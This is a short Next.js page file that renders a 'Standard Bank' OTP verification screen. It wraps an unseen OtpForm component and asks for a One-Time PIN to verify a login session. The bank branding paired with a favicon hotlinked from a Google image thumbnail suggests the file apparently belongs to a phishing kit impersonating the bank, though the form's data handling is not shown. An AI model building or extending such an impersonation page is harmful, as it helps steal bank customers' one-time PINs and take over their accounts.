import { Suspense } from "react";
import { OtpForm } from "./_component/otp-form";
import type { Metadata } from "next";

export const metadata: Metadata = {
  title: "OTP Verification | Standard Bank",
  description: "Enter your One-Time PIN to verify your login session.",
  icons: {
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRFGcVkJT2-qexPBQlBX16ttftLJwD2sX9ZVPrP52oLjVSAzTogcn-tySJV&s=10",
  },
};

export default function OtpPage() {
  return (
    <main className="min-h-screen w-full bg-white flex flex-col justify-between">
      <Suspense
        fallback={
          <div className="min-h-screen w-full flex items-center justify-center bg-white">
            <div className="w-10 h-10 border-4 border-[#0036AD] border-t-transparent rounded-full animate-spin" />
          </div>
        }
      >
        <OtpForm />
      </Suspense>
    </main>
  );
}
